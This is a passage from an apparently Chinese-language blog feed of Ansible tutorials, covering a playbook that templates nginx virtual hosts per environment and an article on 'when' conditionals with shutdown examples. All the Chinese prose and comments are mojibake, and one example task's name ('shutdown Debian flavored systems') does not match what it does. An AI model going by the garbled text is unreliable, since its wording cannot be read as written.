class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir /etc/ansible/playbook/template</span><br></pre></td></tr></table></figure><ul><li>åˆ›å»ºinternalapiçš„nginxè™šæ‹Ÿä¸»æœº</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@ansible template]$vim nginx-internal.conf </span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">  listen 80;</span><br><span class="line"></span><br><span class="line">#ä¸åŒçš„ç¯å¢ƒçš„åŸŸåä¹Ÿä¸åŒ.è¿™é‡Œè°ƒç”¨äº†dwd_envå˜é‡.å¯¹äºdevç¯å¢ƒçš„ä¸»æœºæ¥è¯´.server_nameå°±æ˜¯#internal.dev.msf.net</span><br><span class="line"></span><br><span class="line">  server_name internal.&#123;&#123; dwd_env &#125;&#125;.msf.net;</span><br><span class="line">  root /data/apps/msf-internal-api-&#123;&#123; dwd_env &#125;&#125;/; # ç«™ç‚¹æ ¹ç›®å½•</span><br><span class="line"></span><br><span class="line">  error_log /data/logs/nginx/msf_internal.error.log;</span><br><span class="line">  access_log /data/logs/nginx/msf_internal.access.log main;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  location / &#123;</span><br><span class="line">    index index.html;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œä¸ºäº†æ¼”ç¤º,æ‰€ä»¥é…ç½®æ–‡ä»¶æ¯”è¾ƒç®€å•.å½“ç„¶ç»“åˆtemplateçš„å˜é‡,å¾ªç¯,æ¡ä»¶åˆ¤æ–­ç­‰åŠŸèƒ½,ä¹Ÿå¯ä»¥æ ¹æ®éœ€æ±‚ç¼–å†™å‡ºå¤æ‚çš„nginxç«™ç‚¹é…ç½®æ–‡ä»¶</p></blockquote><ul><li>åˆ›å»ºopenapiçš„nginxè™šæ‹Ÿä¸»æœº</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">[root@ansible template]$vim nginx-open.conf </span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line">  listen 80;</span><br><span class="line"></span><br><span class="line">  server_name open.&#123;&#123; dwd_env &#125;&#125;.msf.net;</span><br><span class="line">  root /data/apps/msf-open-api-&#123;&#123; dwd_env &#125;&#125;/; # ç«™ç‚¹æ ¹ç›®å½•</span><br><span class="line"></span><br><span class="line">  error_log /data/logs/nginx/msf_open.error.log;</span><br><span class="line">  access_log /data/logs/nginx/msf_open.access.log main;</span><br><span class="line"></span><br><span class="line">  # å¦‚æœURLä¸­åŒ…å«app.phpï¼Œåˆ™è½¬å‘ä¸ºä¼ªé™æ€æ ¼å¼</span><br><span class="line"></span><br><span class="line">  location / &#123;</span><br><span class="line">    index index.html;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="3-åˆ›å»ºnginxçš„index-htmlé¦–é¡µæ–‡ä»¶-è¿™é‡Œä¸ºäº†æ¼”ç¤ºä¹Ÿåªæ˜¯ç¼–å†™ä¸€ä¸ªç®€å•æ–‡ä»¶"><a href="#3-åˆ›å»ºnginxçš„index-htmlé¦–é¡µæ–‡ä»¶-è¿™é‡Œä¸ºäº†æ¼”ç¤ºä¹Ÿåªæ˜¯ç¼–å†™ä¸€ä¸ªç®€å•æ–‡ä»¶" class="headerlink" title="3.  åˆ›å»ºnginxçš„index.htmlé¦–é¡µæ–‡ä»¶.è¿™é‡Œä¸ºäº†æ¼”ç¤ºä¹Ÿåªæ˜¯ç¼–å†™ä¸€ä¸ªç®€å•æ–‡ä»¶"></a>3.  åˆ›å»ºnginxçš„index.htmlé¦–é¡µæ–‡ä»¶.è¿™é‡Œä¸ºäº†æ¼”ç¤ºä¹Ÿåªæ˜¯ç¼–å†™ä¸€ä¸ªç®€å•æ–‡ä»¶</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#åˆ›å»ºfileç›®å½•,ç”¨äºç»Ÿä¸€å­˜æ”¾Playbookçš„æ–‡ä»¶</span><br><span class="line">mkdir /etc/ansible/playbook/files</span><br><span class="line"></span><br><span class="line">#åˆ›å»ºopenapiçš„é¦–é¡µæ–‡ä»¶</span><br><span class="line">[root@ansible files]$cat nginx-open.html </span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">   &lt;title&gt;Welcome to dwd openapi website &lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;nginx,configured by ansible&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;If you see this,Ansible successfully installed and configured nginx .&lt;/p&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">#åˆ›å»ºinternalapiçš„é¦–é¡µæ–‡ä»¶</span><br><span class="line">[root@ansible files]$cat nginx-internal.html </span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">   &lt;title&gt;Welcome to dwd internal website &lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line"></span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;nginx,configured by ansible&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;If you see this,Ansible successfully installed and configured nginx .&lt;/p&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><hr><h3 id="ç¼–æ’playbook"><a href="#ç¼–æ’playbook" class="headerlink" title="ç¼–æ’playbook"></a>ç¼–æ’playbook</h3><p>nginxæ‰€éœ€çš„é…ç½®æ–‡ä»¶å’Œèµ„æºç«™ç‚¹æ–‡ä»¶éƒ½å‡†å¤‡å®Œæ¯•å,å°±å¯ä»¥ç¼–æ’playbookäº†.</p><p>playbookå¤§è‡´åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªtasks:</p><ul><li>æ£€æŸ¥nginxæ˜¯å¦å®‰è£…,(å¦‚æœæ˜¯æ–°æœåŠ¡å™¨,æˆ–è€…åœ¨nginxæœåŠ¡å™¨ä¸Šæ·»åŠ æ–°é¡¹ç›®,åˆ™æ­¥éª¤å¯ç•¥)</li><li>æ·»åŠ nginxçš„yumæº,å®‰è£…nginx (åŒä¸Š)</li><li>åˆ›å»ºnginxç«™ç‚¹èµ„æºç›®å½•</li><li>åœ¨è¯¥ç›®å½•ä¸‹,åˆ›å»ºnginxä¸»é¡µæ–‡ä»¶</li><li>åˆ›å»ºnginxè™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶(é‡å¯nginxæœåŠ¡)</li><li>å¯åŠ¨nginx</li></ul><p>ä¸‹é¢æ˜¯å…·ä½“çš„Playbookæ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">[root@ansible playbook]$cat  nginx_env.yml </span><br><span class="line">---</span><br><span class="line">#all:!ä¸»æœºåçš„ç”¨æ³•è¡¨ç¤ºé™¤äº†è¿™å°æœåŠ¡å™¨å¤–,åœ¨æ‰€æœ‰ä¸»æœºèŠ‚ç‚¹æ‰§è¡Œplaybook</span><br><span class="line"> - hosts: all:!host120</span><br><span class="line">   remote_user: root</span><br><span class="line">   tasks:</span><br><span class="line">    </span><br><span class="line">    #è¿™é‡Œç”¨åˆ°äº†registeræ³¨å†Œå˜é‡,å¹¶ä¸”å¿½ç•¥äº†taskæ‰§è¡Œé”™è¯¯çš„æƒ…å†µ.åˆ¤æ–­æ˜¯å¦æœ‰nginxçš„yumæº</span><br><span class="line">     - name: check if there is nginx repo on server</span><br><span class="line">       shell: yum repolist all | grep nginx</span><br><span class="line">       register: nginx_repo</span><br><span class="line">       ignore_errors: True</span><br><span class="line"></span><br><span class="line">   #è¿™é‡Œç”¨åˆ°äº†whenæ¡ä»¶åˆ¤æ–­,å¦‚æœå˜é‡nginx_repoæ‰§è¡Œå¤±è´¥,åˆ™æ·»åŠ nginxçš„yumæº</span><br><span class="line">     - name: install nginx yum repo,if there is no nginx repo</span><br><span class="line">       command: rpm -Uvh http://nginx.org/packages/centos/7/noarch/RPMS/nginx-release-centos-7-0.el7.ngx.noarch.rpm</span><br><span class="line">       when: nginx_repo is failed</span><br><span class="line"></span><br><span class="line">     - name: install nginx</span><br><span class="line">       yum: name=nginx state=present</span><br><span class="line">      </span><br><span class="line">   #åˆ›å»ºNginxèµ„æºç›®å½•,è¿™é‡Œä½¿ç”¨äº†åµŒå¥—å¾ªç¯.item[0]è¡¨ç¤ºå¾ªç¯&apos;open&apos;,&apos;internal&apos;.åœ¨æ¯æ¬¡å¾ªç¯item[0]æ—¶éƒ½å¾ªç¯ä¸€éitem[1],ä¹Ÿå°±æ˜¯&apos;release,vendor,shared.</span><br><span class="line">   #ä¸‹é¢çš„è¯­å¥ç±»ä¼¼äºshellçš„å‘½ä»¤:</span><br><span class="line">   mkdir -pv /data/apps/msf-&#123;open,internal&#125;-api/&#123;releases,vendor,shared&#125;</span><br><span class="line">   </span><br><span class="line">     - name: create project dir</span><br><span class="line">       file: path=/data/apps/msf-&#123;&#123; item[0] &#125;&#125;-api-&#123;&#123; dwd_env &#125;&#125;/&#123;&#123; item[1] &#125;&#125; recurse=yes owner=root group=root mode=0644 state=directory</span><br><span class="line">       with_nested:</span><br><span class="line">         - [&apos;open&apos;,&apos;internal&apos;]</span><br><span class="line">         - [&apos;releases&apos;,&apos;vendor&apos;,&apos;shared&apos;]</span><br><span class="line"></span><br><span class="line">     - name: create nginx log dir</span><br><span class="line">       file: path=/data/logs/nginx state=directory recurse=yes owner=root group=root mode=0644</span><br><span class="line">    </span><br><span class="line">    #ä¸‹é¢ä½¿ç”¨äº†with_itemsçš„æ ‡å‡†å¾ªç¯</span><br><span class="line">     - name: copy nginx conf file</span><br><span class="line">       template: src=template/nginx-&#123;&#123; item &#125;&#125;.conf dest=/etc/nginx/conf.d/msf-&#123;&#123; item &#125;&#125;-api.conf</span><br><span class="line">       with_items:</span><br><span class="line">          - open</span><br><span class="line">          - internal        </span><br><span class="line">       notify: restart nginx</span><br><span class="line"></span><br><span class="line">     - name: copy nginx web file</span><br><span class="line">       copy: src=files/nginx-&#123;&#123; item &#125;&#125;.html dest=/data/apps/msf-&#123;&#123; item &#125;&#125;-api-&#123;&#123; dwd_env &#125;&#125;/index.html </span><br><span class="line">       with_items:</span><br><span class="line">         - open</span><br><span class="line">         - internal     </span><br><span class="line"></span><br><span class="line">     - name: start nginx</span><br><span class="line">       service: name=nginx state=started</span><br><span class="line"></span><br><span class="line">   handlers:</span><br><span class="line">     - name: restart nginx</span><br><span class="line">       service: name=nginx state=restarted</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œæ¯•å,å¯ä»¥åœ¨ä¸¤å°èŠ‚ç‚¹ä¸Šæ£€æŸ¥æ˜¯å¦æŒ‰æˆ‘ä»¬éœ€æ±‚åˆ›å»ºæ­£ç¡®çš„ç›®å½•å’Œæ–‡ä»¶:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"># åœ¨betaç¯å¢ƒæœåŠ¡ä¸Š,åˆ›å»ºäº†æ­£ç¡®çš„ç›®å½•ç»“æ„å’Œé¦–é¡µæ–‡ä»¶</span><br><span class="line"></span><br><span class="line">[root@localhost conf.d]# ll /data/apps/*</span><br><span class="line">/data/apps/msf-internal-api-beta:</span><br><span class="line">total 4</span><br><span class="line">-rw-r--r-- 1 root root 227 Aug  3 21:09 index.html</span><br><span class="line">drw-r--r-- 2 root root   6 Aug  3 21:02 releases</span><br><span class="line">drw-r--r-- 2 root root   6 Aug  3 21:02 shared</span><br><span class="line">drw-r--r-- 2 root root   6 Aug  3 21:02 vendor</span><br><span class="line"></span><br><span class="line">/data/apps/msf-open-api-beta:</span><br><span class="line">total 4</span><br><span class="line">-rw-r--r-- 1 root root 226 Aug  3 21:09 index.html</span><br><span class="line">drw-r--r-- 2 root root   6 Aug  3 21:02 releases</span><br><span class="line">drw-r--r-- 2 root root   6 Aug  3 21:02 shared</span><br><span class="line">drw-r--r-- 2 root root   6 Aug  3 21:02 vendor</span><br><span class="line"></span><br><span class="line">#åˆ›å»ºäº†æ­£ç¡®çš„betaç¯å¢ƒçš„nginxè™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶</span><br><span class="line">[root@localhost conf.d]# cat msf-open-api.conf </span><br><span class="line">server &#123;</span><br><span class="line">  listen 80;</span><br><span class="line"></span><br><span class="line">  server_name open.beta.msf.net;</span><br><span class="line">  root /data/apps/msf-open-api-beta/; # ç«™ç‚¹æ ¹ç›®å½•</span><br><span class="line"></span><br><span class="line">  error_log /data/logs/nginx/msf_open.error.log;</span><br><span class="line">  access_log /data/logs/nginx/msf_open.access.log main;</span><br><span class="line"></span><br><span class="line">  # å¦‚æœURLä¸­åŒ…å«app.phpï¼Œåˆ™è½¬å‘ä¸ºä¼ªé™æ€æ ¼å¼</span><br><span class="line"></span><br><span class="line">  location / &#123;</span><br><span class="line">    index index.html;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#å…¶ä»–æ–‡ä»¶æ£€æŸ¥è¿‡ç¨‹ç•¥.</span><br></pre></td></tr></table></figure><p>åœ¨å¦å¤–ä¸€å°æœåŠ¡å™¨ä¸Šæ£€æŸ¥ç»“æœå¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># åˆ›å»ºäº†æ­£ç¡®çš„devç¯å¢ƒç›®å½•:</span><br><span class="line">[root@localhost conf.d]$ll /data/apps/*</span><br><span class="line">/data/apps/msf-internal-api-dev:</span><br><span class="line">total 4</span><br><span class="line">-rw-r--r-- 1 root root 227 Sep  9 03:22 index.html</span><br><span class="line">drw-r--r-- 2 root root   6 Sep  9 03:14 releases</span><br><span class="line">drw-r--r-- 2 root root   6 Sep  9 03:14 shared</span><br><span class="line">drw-r--r-- 2 root root   6 Sep  9 03:14 vendor</span><br><span class="line"></span><br><span class="line">/data/apps/msf-open-api-dev:</span><br><span class="line">total 4</span><br><span class="line">-rw-r--r-- 1 root root 226 Sep  9 03:22 index.html</span><br><span class="line">drw-r--r-- 2 root root   6 Sep  9 03:14 releases</span><br><span class="line">drw-r--r-- 2 root root   6 Sep  9 03:14 shared</span><br><span class="line">drw-r--r-- 2 root root   6 Sep  9 03:14 vendor</span><br><span class="line"></span><br><span class="line">#åˆ›å»ºäº†æ­£ç¡®çš„nginxé…ç½®æ–‡ä»¶</span><br><span class="line"></span><br><span class="line">[root@localhost conf.d]$cat msf-open-api.conf </span><br><span class="line">server &#123;</span><br><span class="line">  listen 80;</span><br><span class="line"></span><br><span class="line">  server_name open.dev.msf.net;</span><br><span class="line">  root /data/apps/msf-open-api-dev/; # ç«™ç‚¹æ ¹ç›®å½•</span><br><span class="line"></span><br><span class="line">  error_log /data/logs/nginx/msf_open.error.log;</span><br><span class="line">  access_log /data/logs/nginx/msf_open.access.log main;</span><br><span class="line"></span><br><span class="line">  # å¦‚æœURLä¸­åŒ…å«app.phpï¼Œåˆ™è½¬å‘ä¸ºä¼ªé™æ€æ ¼å¼</span><br><span class="line"></span><br><span class="line">  location / &#123;</span><br><span class="line">    index index.html;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯è§æ‰€æœ‰çš„ç›®å½•å’Œé…ç½®æ–‡ä»¶éƒ½æŒ‰æˆ‘ä»¬éœ€æ±‚åšåˆ°è‡ªåŠ¨åŒ–éƒ¨ç½²,è¿™ä¸ºæˆ‘ä»¬èŠ‚çœäº†å¤§é‡çš„æ—¶é—´,å·¥ä½œæ•ˆç‡å¤§å¹…æå‡.è€Œä¸”ä¹Ÿèƒ½å¾ˆè½»æ¾çš„èƒœä»»æ›´å¤æ‚çš„é¡¹ç›®ç¯å¢ƒé…ç½®å·¥ä½œ</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Ansible-éƒ¨ç½²Nginxé¡¹ç›®çš„playbookå®è·µ&quot;&gt;&lt;a href=&quot;#Ansible-éƒ¨ç½²Nginxé¡¹ç›®çš„playbookå®è·µ&quot; class=&quot;headerlink&quot; title=&quot;Ansible éƒ¨ç½²Nginxé¡¹ç›®çš„playbookå®è·µ&quot;&gt;&lt;/a&gt;Ansible éƒ¨ç½²Nginxé¡¹ç›®çš„playbookå®è·µ&lt;/h2&gt;&lt;p&gt;å·¥ä½œä¸­ç»å¸¸éœ€è¦æ­å»ºé¡¹ç›®çš„ä¸šåŠ¡ç¯å¢ƒ.éœ€è¦éƒ¨ç½²åŒä¸€å¥—nginxç«™ç‚¹ä¸šåŠ¡åœ¨è”è°ƒ,æµ‹è¯•,é¢„å‘å¸ƒ,ç”Ÿäº§ç­‰å„ç§ä¸åŒç¯å¢ƒçš„æœåŠ¡å™¨ä¸Š.è¿™äº›å·¥ä½œä¸»è¦åŒ…æ‹¬ä¸¤ä¸ªéƒ¨åˆ†:åˆ›å»ºwebèµ„æºç›®å½•,nginxç«™ç‚¹é…ç½®.&lt;/p&gt;
&lt;p&gt;ä¸‹é¢æ¥çœ‹çœ‹å¦‚ä½•ä½¿ç”¨playbookæ¥è‡ªåŠ¨åŒ–éƒ¨ç½²é¡¹ç›®åˆ°ä¸åŒç¯å¢ƒçš„å¤šå°æœåŠ¡å™¨ä¸Š:&lt;/p&gt;
    
    </summary>
    
      <category term="Ansible" scheme="https://jesse.top/categories/Ansible/"/>
    
    
      <category term="Ansible" scheme="https://jesse.top/tags/Ansible/"/>
    
  </entry>
  
  <entry>
    <title>Ansible æ¡ä»¶é€‰æ‹©</title>
    <link href="https://jesse.top/2018/08/29/Ansible/Ansible%20%E6%9D%A1%E4%BB%B6%E9%80%89%E6%8B%A9/"/>
    <id>https://jesse.top/2018/08/29/Ansible/Ansible æ¡ä»¶é€‰æ‹©/</id>
    <published>2018-08-29T14:59:58.000Z</published>
    <updated>2018-12-01T14:50:12.540Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Ansible-æ¡ä»¶é€‰æ‹©"><a href="#Ansible-æ¡ä»¶é€‰æ‹©" class="headerlink" title="Ansible æ¡ä»¶é€‰æ‹©"></a>Ansible æ¡ä»¶é€‰æ‹©</h2><p>playbookä¹Ÿå¯ä»¥åƒshellè„šæœ¬çš„ifè¯­å¥é‚£æ ·,åŸºäºä¸€ä¸ªå˜é‡çš„ç»“æœæ¥åˆ¤æ–­æ˜¯å¦åº”è¯¥æ‰§è¡ŒæŸä¸ªtask.åªæ˜¯ansibleçš„é€»è¾‘åˆ¤æ–­å’Œè¯­æ³•ä¸Šè¦åˆ«æ‰­,å¤æ‚ç‚¹.</p><a id="more"></a><hr><h3 id="whenè¯­å¥"><a href="#whenè¯­å¥" class="headerlink" title="whenè¯­å¥"></a>whenè¯­å¥</h3><p>whenè¯­å¥çš„æ¡ä»¶åˆ¤æ–­ä½¿ç”¨éå¸¸ç®€å•,ä¸€èˆ¬åŒ…å«2ç§ç”¨æ³•:</p><p>1.åŸºäºå˜é‡å€¼æ¥åˆ¤æ–­æ˜¯å¦åº”è¯¥æ‰§è¡ŒæŸä¸ªtask:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">---</span><br><span class="line"> - hosts: all</span><br><span class="line">   tasks:</span><br><span class="line">     - name: &quot;shutdown Debian flavored systems&quot;</span><br><span class="line">       file: path=/tmp/when state=touch</span><br><span class="line">       when: ansible_default_ipv4.address == &quot;10.0.4.230&quot;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œç»“æœ:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost playbook]$ansible-playbook when.yaml</span><br><span class="line"></span><br><span class="line">PLAY [all] *******************************************************************************************************************************************************************************************************</span><br><span class="line"></span><br><span class="line">TASK [Gathering Facts] *******************************************************************************************************************************************************************************************</span><br><span class="line">ok: [10.0.4.231]</span><br><span class="line">ok: [10.0.4.230]</span><br><span class="line"></span><br><span class="line">TASK [shutdown Debian flavored systems] **************************************************************************************************************************************************************************</span><br><span class="line">skipping: [10.0.4.231]</span><br><span class="line">changed: [10.0.4.230]</span><br><span class="line"></span><br><span class="line">PLAY RECAP *******************************************************************************************************************************************************************************************************</span><br><span class="line">10.0.4.230                 : ok=2    changed=1    unreachable=0    failed=0</span><br><span class="line">10.0.4.231                 : ok=1    changed=0    unreachable=0    failed=0</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åªåœ¨230è¿™ä¸ªIPä¸Šæ‰§è¡Œäº†åŠ¨ä½œ.</p><p>å¦å¤–,è¿˜å¯ä»¥åŸºäºor æˆ–è€… andçš„æ¡ä»¶åˆ¤æ–­.ä¾‹å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tasks:</span><br><span class="line">  - name: &quot;shut down CentOS 6 and Debian 7 systems&quot;</span><br><span class="line">    command: /sbin/shutdown -t now</span><br><span class="line">    when: (ansible_distribution == &quot;CentOS&quot; and ansible_distribution_major_version == &quot;6&quot;) or</span><br><span class="line">          (ansible_distribution == &quot;Debian&quot; and ansible_distribution_major_version == &quot;7&quot;)</span><br></pre></td></tr></table></figure><p>æˆ–è€…and,åŒæ—¶æ»¡è¶³2ä¸ªæ¡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tasks:</span><br><span class="line">  - name: &quot;shut down CentOS 6 systems&quot;</span><br><span class="line">    command: /sbin/shutdown -t now</span><br><span class="line">    when:</span><br><span class="line">      - ansible_distribution == &quot;CentOS&quot;</span><br><span class="line">      - ansible_distribution_major_version == &quot;6&quot;</span><br></pre></td></tr></table></figure><blockquote><p>note: ä¹Ÿå¯ä»¥å†™æˆ when: ansible_distribution == â€œCentOSâ€ and ansible_distribution_major_version == â€œ6â€</p></blockquote><p>2.åŸºäºæŸä¸ªtaskæ‰§è¡Œçš„æˆåŠŸä¸å¦ä½œä¸ºæ¡ä»¶.ä¾‹å¦‚.æ‰§è¡Œ ls /home/workè¿™ä¸ªåŠ¨ä½œ,æ¥åˆ¤æ–­å¦‚æœæœ‰è¿™ä¸ªæ–‡ä»¶,åˆ™åˆ›å»ºä¸ªè½¯é“¾.æ­¤æ—¶å°±è¦å¿½ç•¥ls /home/work è¿™ä¸ªåŠ¨ä½œå¯èƒ½å‡ºç°é”™è¯¯(æ–‡ä»¶ä¸å­˜åœ¨).</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line"> - hosts: all</span><br><span class="line">   tasks:</span><br><span class="line">     - name: &quot;test file&quot;</span><br><span class="line">       command: ls /home/work</span><br><span class="line">       ignore_errors: True</span><br><span class="line">       register: result</span><br><span class="line"></span><br><span class="line">     - name: &quot;create link&quot;</span><br><span class="line">       file: src=/home/work dest=/tmp/work  state=link</span><br><span class="line">       when: result is succeeded</span><br><span class="line"></span><br><span class="line">     - name: &quot;create /tmp/home/work&quot;</span><br><span class="line">       file: src=/tmp/home/work state=directory</span><br><span class="line">       when: result is failed</span><br></pre></td></tr></table></figure><p>registeræ³¨å†Œä¸€ä¸ªresultçš„å˜é‡,è¯¥å˜é‡æ˜¯ls /home/workè¿™ä¸ªtaskçš„æ‰§è¡Œç»“æœ..ç„¶åwhenæ¡ä»¶åˆ¤æ–­å½“resultæ‰§è¡ŒæˆåŠŸ,æˆ–è€…æ‰§è¡Œå¤±è´¥æ—¶,æ‰æ‰§è¡Œç›¸åº”çš„taskä»»åŠ¡</p><hr><h3 id="whenç»“åˆloopå¾ªç¯"><a href="#whenç»“åˆloopå¾ªç¯" class="headerlink" title="whenç»“åˆloopå¾ªç¯"></a>whenç»“åˆloopå¾ªç¯</h3><p>å˜é‡æ³¨å†Œçš„ç»“æœå¯ä»¥æ˜¯å­—ç¬¦ä¸²,å¸ƒå°”å€¼,ä¹Ÿå¯ä»¥æ˜¯åˆ—è¡¨.ä½¿ç”¨â€loopâ€æˆ–è€…â€with_itemsâ€å…³é”®å­—å¯ä»¥å¯¹å˜é‡è¿›è¡Œå¾ªç¯.ä¾‹å¦‚:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 